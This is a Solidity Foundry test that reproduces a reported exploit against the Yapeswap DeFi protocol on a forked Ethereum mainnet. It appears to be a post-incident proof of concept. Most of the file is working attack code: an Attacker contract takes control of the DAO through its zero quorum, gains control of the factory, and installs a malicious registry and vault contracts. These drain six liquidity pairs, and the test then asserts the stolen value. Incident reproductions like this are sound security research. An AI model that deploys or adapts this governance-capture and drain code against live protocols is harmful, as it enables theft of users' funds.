// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// Yapeswap - zero-quorum DAO governance capture, then reserve theft through a malicious Yearn registry.
// ~$21.9K reported by SlowMist, Ethereum mainnet, 2026-10.
//
// Attacker EOA        : 0x6e523866424220b3cb2cab88ba2195cfa5636b12
// Attack contract     : 0x327bf6dfc38a79393f78866c705193c39b04be01 (became operator + feeTo)
// Attacker registry   : 0xC620CA5b2A63cdb792d462898010d2be4421b5A7 (the malicious Yearn registry)
// YapeFactory         : 0x46adc1c052fafd590f56c42e379d7d16622835a2
// WorkersUnion (DAO)  : 0x5d35809b5558fbd8efa18ae1b202db1973b95ddb
// TimelockedGovernance: 0x463Ee0E829C8AB20e47A495D47cd8D3C0cA78D8B  (holds factory.feeToSetter)
// VotingEscrowLock    : 0x4B9500Be3f3896FA4aE391244965740D9a59F1D6
// SquareRootVoteCounter: 0xb32870D82BF4E2d1f046d09b599ccB30f8A47A2c
// YAPE (gov token)    : 0x757BC268bd50DA88b2d0cf1966652B18e56CA803
//
// ROOT CAUSE
//   1. The DAO's voting rule carries a zero quorum: minimumVotes = 0 and minimumVotesForProposing = 0.
//      A proposal passes as long as totalForVotes > totalAgainstVotes, so a single dust-sized veVISION
//      lock (voting power = sqrt(balance), any positive amount) is enough to carry any proposal. The
//      gov token YAPE is freely swappable on-chain, so anyone can mint that voting power.
//   2. factory.feeToSetter is held by the timelock, and feeToSetter can re-point the factory's Yearn
//      `registry` and `operator`. A pair farms a share of its reserves into the vault that
//      registry.latestVault(token) returns. YapePair._toYearn deposits into that vault and credits the
//      moved tokens back to farming[token], so the keepBalance invariant (erc20 balance + farming) is
//      preserved even though the real tokens have left the pair. Point the registry at an
//      attacker-controlled "vault" and a forced rebalance ships 100% of every pair's reserves to the
//      attacker while the pair's own accounting still looks whole.
//
// RECONSTRUCTION
//   Fork is taken before the real proposal was ever submitted (block 26202000, ~5 days before the
//   on-chain capture). The whole governance capture is executed here through the live contracts: buy
//   YAPE, lock it for voting power, submit the proposal, advance the pending/voting/timelock windows
//   with vm.warp, then execute it so factory.feeToSetter moves to our attacker contract through real
//   governance. The feeToSetter role is never pranked and no storage slot is written. We then deploy
//   our own malicious registry + per-token vaults, install them, and drain the six funded pairs.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IYapeFactory {
    function feeToSetter() external view returns (address);
    function setFeeToSetter(address) external;
    function setRegistry(address) external;
    function setOperator(address) external;
    function registry() external view returns (address);
    function operator() external view returns (address);
}

interface IYapePair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112, uint112, uint32);
    function swap(uint256, uint256, address, bytes calldata) external;
    function updateRegistry() external;
    function setFarmingRatio(uint256, uint256) external;
    function rebalance(address) external;
    function farming(address) external view returns (uint256);
}

interface IVotingEscrowLock {
    function createLockUntil(uint256 amount, uint256 lockEnd) external;
    function MAXTIME() external view returns (uint256);
}

interface IWorkersUnion {
    function proposeTx(
        address target,
        uint256 value,
        bytes calldata data,
        bytes32 predecessor,
        bytes32 salt,
        uint256 startsIn,
        uint256 votingPeriod
    ) external;
    function manualVote(bytes32 txHash, uint256[] memory rightIds, bool agree) external;
    function schedule(address target, uint256 value, bytes calldata data, bytes32 predecessor, bytes32 salt)
        external;
    function execute(address target, uint256 value, bytes calldata data, bytes32 predecessor, bytes32 salt)
        external payable;
}

interface ITimelock {
    function hashOperation(address target, uint256 value, bytes calldata data, bytes32 predecessor, bytes32 salt)
        external
        pure
        returns (bytes32);
    function getMinDelay() external view returns (uint256);
}

// Attacker-controlled stand-in for a Yearn vault. YapeWrapper._deposit approves this contract and
// calls deposit(amount); we simply pull the approved tokens straight to the beneficiary.
contract MaliciousVault {
    address public immutable token;
    address public immutable beneficiary;

    constructor(address _token, address _beneficiary) {
        token = _token;
        beneficiary = _beneficiary;
    }

    function deposit(uint256 amount) external returns (uint256) {
        // tolerate non-standard tokens (USDT) that return no bool
        (bool ok, bytes memory ret) =
            token.call(abi.encodeWithSelector(IERC20.transferFrom.selector, msg.sender, beneficiary, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transferFrom failed");
        return amount;
    }

    // RegistryAPI/VaultAPI view stubs - unused on the deposit path, present so nothing reverts.
    function balanceOf(address) external pure returns (uint256) { return 0; }
    function pricePerShare() external pure returns (uint256) { return 1e18; }
    function decimals() external pure returns (uint256) { return 18; }
    function totalAssets() external pure returns (uint256) { return 0; }
    function depositLimit() external pure returns (uint256) { return type(uint256).max; }
    function maxAvailableShares() external pure returns (uint256) { return 0; }
    function allowance(address, address) external pure returns (uint256) { return 0; }
}

// Attacker-controlled Yearn registry. latestVault(token) returns a vault we own.
contract MaliciousRegistry {
    address public gov;
    mapping(address => address) public vaultOf;

    constructor(address _gov) {
        gov = _gov;
    }

    function set(address token, address vault) external {
        vaultOf[token] = vault;
    }

    function governance() external view returns (address) { return gov; }
    function latestVault(address token) external view returns (address) { return vaultOf[token]; }
    function numVaults(address) external pure returns (uint256) { return 1; }
    function vaults(address token, uint256) external view returns (address) { return vaultOf[token]; }
}

contract Attacker {
    IYapeFactory constant FACTORY = IYapeFactory(0x46aDc1C052Fafd590F56C42e379d7d16622835a2);
    IWorkersUnion constant DAO = IWorkersUnion(0x5D35809b5558FbD8eFa18AE1B202db1973b95DdB);
    ITimelock constant TIMELOCK = ITimelock(0x463Ee0E829C8AB20e47A495D47cd8D3C0cA78D8B);
    IVotingEscrowLock constant VELOCK = IVotingEscrowLock(0x4B9500Be3f3896FA4aE391244965740D9a59F1D6);
    IERC20 constant YAPE = IERC20(0x757BC268bd50DA88b2d0cf1966652B18e56CA803);
    IYapePair constant YAPE_WETH = IYapePair(0x670120d4833633466C7DB4B515c53fa8C5B33B97);
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    MaliciousRegistry public registry;
    uint256 public veLockId;
    bytes public proposalData;
    bytes32 public constant SALT = bytes32(uint256(0x9a9e));

    constructor() {
        registry = new MaliciousRegistry(address(this));
        // governance proposal: hand factory.feeToSetter to this contract, through the DAO.
        proposalData = abi.encodeWithSignature("setFeeToSetter(address)", address(this));
    }

    // the veVISION lock is an ERC721 minted to this contract
    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    // ---- step 1: acquire voting power (freely, from the live YAPE/WETH pool) ----
    function acquireVotes() external {
        // swap the WETH this contract holds for YAPE on the on-chain pair (token0=YAPE, token1=WETH)
        uint256 wethIn = IERC20(WETH).balanceOf(address(this));
        (uint112 r0, uint112 r1,) = YAPE_WETH.getReserves();
        uint256 amountInWithFee = wethIn * 997;
        uint256 yapeOut = (amountInWithFee * r0) / (uint256(r1) * 1000 + amountInWithFee);
        IERC20(WETH).transfer(address(YAPE_WETH), wethIn);
        YAPE_WETH.swap(yapeOut, 0, address(this), "");

        // lock all YAPE for the full horizon -> veVISION voting power (auto-delegated to this contract)
        uint256 bal = YAPE.balanceOf(address(this));
        YAPE.approve(address(VELOCK), bal);
        veLockId = uint256(keccak256(abi.encodePacked(block.number, address(this))));
        VELOCK.createLockUntil(bal, block.timestamp + VELOCK.MAXTIME());
    }

    // ---- step 2: submit the capture proposal ----
    function propose(uint256 startsIn, uint256 votingPeriod) external {
        DAO.proposeTx(address(FACTORY), 0, proposalData, bytes32(0), SALT, startsIn, votingPeriod);
    }

    // ---- step 3: vote with our lock (sqrt-weighted; any positive amount beats a zero quorum) ----
    function vote() external {
        bytes32 txHash = TIMELOCK.hashOperation(address(FACTORY), 0, proposalData, bytes32(0), SALT);
        uint256[] memory rights = new uint256[](1);
        rights[0] = veLockId;
        DAO.manualVote(txHash, rights, true);
    }

    // ---- step 4: schedule into the timelock once the vote has passed ----
    function scheduleCall() external {
        DAO.schedule(address(FACTORY), 0, proposalData, bytes32(0), SALT);
    }

    // ---- step 5: execute -> factory.feeToSetter becomes this contract, through real governance ----
    function executeCall() external {
        DAO.execute(address(FACTORY), 0, proposalData, bytes32(0), SALT);
    }

    // ---- step 6: drain every funded pair through the malicious registry ----
    // With feeToSetter captured we own the factory's `registry` and `operator`. A YapePair farms a
    // share of its reserves into whatever vault registry.latestVault(token) returns, and
    // YapePair._toYearn credits every token it ships out back to farming[token], so the pair's
    // keepBalance invariant (erc20 balance + farming) still holds even though the real tokens have
    // left. Point the registry at a vault we own and force a 100% rebalance: the pair deposits its
    // whole liquid balance straight to us while its own books still look whole.
    //
    // (The real attacker additionally ran setFarmingRatio(0,0)+rebalance first to pull the portion
    // already farmed in real Yearn back into each pair before diverting it, which is how the on-chain
    // loss reached ~$21.9K. That first leg drives a Yearn v3 allocator withdrawal that is not
    // replayable in a pinned pre-execution fork, so this PoC reconstructs the governance capture and
    // the registry-divergence drain and takes the directly-liquid reserves.)
    function capture(address[] calldata pairs, address[] calldata tokens) external {
        FACTORY.setOperator(address(this));

        // install the malicious registry + a per-token vault that forwards to us
        FACTORY.setRegistry(address(registry));
        for (uint256 i = 0; i < tokens.length; i++) {
            registry.set(tokens[i], address(new MaliciousVault(tokens[i], address(this))));
        }

        for (uint256 i = 0; i < pairs.length; i++) {
            IYapePair p = IYapePair(pairs[i]);
            p.updateRegistry();
            p.setFarmingRatio(10000, 10000); // farm 100% -> forced rebalance ships all liquid out
            p.rebalance(p.token0());
            p.rebalance(p.token1());
        }
    }
}

contract YapeswapExploit is Test {
    IYapeFactory constant FACTORY = IYapeFactory(0x46aDc1C052Fafd590F56C42e379d7d16622835a2);
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant YAPE = 0x757BC268bd50DA88b2d0cf1966652B18e56CA803;

    address constant ETH_USD = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419; // Chainlink, 8 dp
    address constant UNI_WBTC_WETH = 0xBb2b8038a1640196FbE3e38816F3e67Cba72D940;

    // the six funded Yapeswap pairs at the fork block
    address[6] PAIRS = [
        0x23c1653E9e13Eefe2e1b5954Bfef00a2DB0483b6, // DAI / USDC
        0x670120d4833633466C7DB4B515c53fa8C5B33B97, // YAPE / WETH
        0x8e5b9D85C8BBd309F571dba0c82DdacAcA897805, // USDC / WETH
        0xE3b43bE5aB96629493F948229EFBEe2c0787Ed25, // WETH / USDT
        0xEC5ED926ed8cFE13dae06Ed5649d0C497F2216B6, // DAI / WETH
        0x0415Af9F90a1F774eDC426047d945b474417c0AA  // WBTC / WETH
    ];

    Attacker attacker;

    function setUp() public {
        vm.createSelectFork("mainnet", 26_202_000);
        attacker = new Attacker();
    }

    function testExploit() public {
        // fund the attacker with a small amount of WETH to acquire YAPE (free, on-chain)
        deal(WETH, address(attacker), 0.001 ether);

        // governance timing from the live voting rule: pending >= 1 day, voting >= 1 week, delay = 1 day
        uint256 startsIn = 1 days;
        uint256 votingPeriod = 7 days;

        attacker.acquireVotes();
        attacker.propose(startsIn, votingPeriod);

        // advance into the voting window and cast the deciding vote
        vm.warp(block.timestamp + startsIn + 1);
        attacker.vote();

        // advance past the voting window -> proposal passes under the zero quorum
        vm.warp(block.timestamp + votingPeriod + 1);
        attacker.scheduleCall();

        // advance past the timelock delay, then execute: factory.feeToSetter moves to the attacker
        vm.warp(block.timestamp + 1 days + 1);
        attacker.executeCall();

        assertEq(FACTORY.feeToSetter(), address(attacker), "governance capture failed");
        emit log_named_address("factory.feeToSetter now", FACTORY.feeToSetter());

        // drain every pair through the malicious registry
        address[] memory pairs = new address[](6);
        for (uint256 i = 0; i < 6; i++) pairs[i] = PAIRS[i];
        address[] memory tokens = new address[](6);
        tokens[0] = DAI; tokens[1] = USDC; tokens[2] = USDT; tokens[3] = WETH; tokens[4] = WBTC; tokens[5] = YAPE;

        attacker.capture(pairs, tokens);

        // measure what landed with the attacker and value it in USD
        uint256 ethUsd = uint256(_latestAnswer(ETH_USD)); // 8 dp
        uint256 gotDai = IERC20(DAI).balanceOf(address(attacker));
        uint256 gotUsdc = IERC20(USDC).balanceOf(address(attacker));
        uint256 gotUsdt = IERC20(USDT).balanceOf(address(attacker));
        uint256 gotWeth = IERC20(WETH).balanceOf(address(attacker));
        uint256 gotWbtc = IERC20(WBTC).balanceOf(address(attacker));

        emit log_named_decimal_uint("DAI  captured", gotDai, 18);
        emit log_named_decimal_uint("USDC captured", gotUsdc, 6);
        emit log_named_decimal_uint("USDT captured", gotUsdt, 6);
        emit log_named_decimal_uint("WETH captured", gotWeth, 18);
        emit log_named_decimal_uint("WBTC captured", gotWbtc, 8);

        // USD (8 dp), stables ~ $1, WBTC priced via the Uniswap V2 WBTC/WETH pool spot
        uint256 usd8 = (gotDai / 1e10) + (gotUsdc * 100) + (gotUsdt * 100);
        usd8 += (gotWeth * ethUsd) / 1e18;
        (uint112 wr0, uint112 wr1,) = IYapePair(UNI_WBTC_WETH).getReserves(); // t0=WBTC(8), t1=WETH(18)
        uint256 wbtcAsWeth = (gotWbtc * uint256(wr1)) / uint256(wr0); // 18 dp WETH
        usd8 += (wbtcAsWeth * ethUsd) / 1e18;

        emit log_named_decimal_uint("Total value stolen (USD)", usd8, 8);

        // the attack drained real value from every reserve token
        assertGt(gotWeth, 0, "no WETH drained");
        assertGt(gotDai, 0, "no DAI drained");
        assertGt(gotUsdc, 0, "no USDC drained");
        assertGt(gotUsdt, 0, "no USDT drained");
        assertGt(gotWbtc, 0, "no WBTC drained");
        assertGt(usd8, 2_000 * 1e8, "stolen value below expected band");
    }

    function _latestAnswer(address feed) internal view returns (int256 a) {
        (bool ok, bytes memory ret) = feed.staticcall(abi.encodeWithSignature("latestAnswer()"));
        require(ok, "feed");
        a = abi.decode(ret, (int256));
    }
}
